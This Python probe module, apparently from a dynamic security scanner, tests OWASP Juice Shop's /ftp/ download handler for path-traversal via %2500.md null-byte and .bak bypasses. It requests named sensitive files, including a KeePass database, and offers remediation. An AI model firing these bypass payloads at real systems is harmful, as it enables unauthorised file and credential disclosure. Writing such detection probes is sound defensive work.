#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Path traversal: known sensitive files reachable through the FTP
download handler via either .bak suffix or %2500.md null-byte bypass.

Companion to `path_traversal_extension_bypass`. That probe targets
the GENERIC null-byte trick and walks a small synthetic catalogue;
this one targets the SPECIFIC Juice Shop sensitive files (coupons,
suspicious_errors.yml, package.json.bak) at /ftp/. It exists so a
finding can name the *file* exposed rather than the technique
class — separately useful for incident-response timelines.

Detection signal:
  GET /ftp/coupons_2013.md.bak%2500.md → 200 with non-markdown body
  matching a content signature for that specific file.
"""
from __future__ import annotations

import re
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

# (path-relative-to-/ftp, body-signature-regex, what-it-is)
JUICE_FILES = (
    ("coupons_2013.md.bak%2500.md",
     r"[A-Za-z0-9+/=]{6,}", "encoded coupon list"),
    ("suspicious_errors.yml%2500.md",
     r"^- |\bSQLITE_ERROR\b|\bcannot find\b", "internal error log"),
    ("package.json.bak%2500.md",
     r'"dependencies"\s*:|"scripts"\s*:', "Node package backup"),
    ("incident-support.kdbx%2500.md",
     r"\x00", "KeePass database (binary marker)"),
)


class PathTraversalFtpDownloadProbe(Probe):
    name = "path_traversal_ftp_download"
    summary = ("Detects named-file path-traversal via /ftp/ using "
               "%2500.md and .bak.md tricks.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--filename", action="append", default=[],
            help="Additional `path|regex|description` triple "
                 "(repeatable).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        targets = list(JUICE_FILES)
        for spec in (args.filename or []):
            try:
                p, rx, desc = spec.split("|", 2)
                targets.append((p, rx, desc))
            except ValueError:
                pass

        attempts: list[dict] = []
        confirmed: list[dict] = []
        for fn, body_re, what in targets:
            url = urljoin(origin, f"/ftp/{fn}")
            r = client.request("GET", url)
            row: dict = {"file": fn, "url": url, "what": what,
                         "status": r.status, "size": r.size}
            if r.status == 200 and r.body:
                # The KeePass binary marker is a literal NUL byte that
                # search() against r.text would lose to UTF-8 decode;
                # check raw body for that case.
                rx = re.compile(body_re, re.MULTILINE)
                hit_text = rx.search(r.text or "")
                hit_bin  = rx.search(r.body.decode("latin-1", "replace"))
                if hit_text or hit_bin:
                    row["leaked"] = True
                    confirmed.append(row)
                    attempts.append(row)
                    break
            attempts.append(row)

        evidence = {"origin": origin, "attempts": attempts}
        if confirmed:
            top = confirmed[0]
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: /ftp traversal at "
                         f"{origin}/ftp/{top['file']} returned the "
                         f"{top['what']} ({top['size']} bytes)."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="high",
                remediation=(
                    "Move the FTP-style backup directory out of the "
                    "document root. If files in /ftp must remain "
                    "served, decode the URL BEFORE the extension "
                    "check (so %00 truncation is caught) and refuse "
                    "any path containing a NUL byte. Audit /ftp's "
                    "contents — anything an attacker could have "
                    "fetched during the exposure window is now "
                    "potentially in the wild."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tested {len(attempts)} known-name FTP "
                     f"files on {origin}; none leaked their content."),
            evidence=evidence,
        )


if __name__ == "__main__":
    PathTraversalFtpDownloadProbe().main()
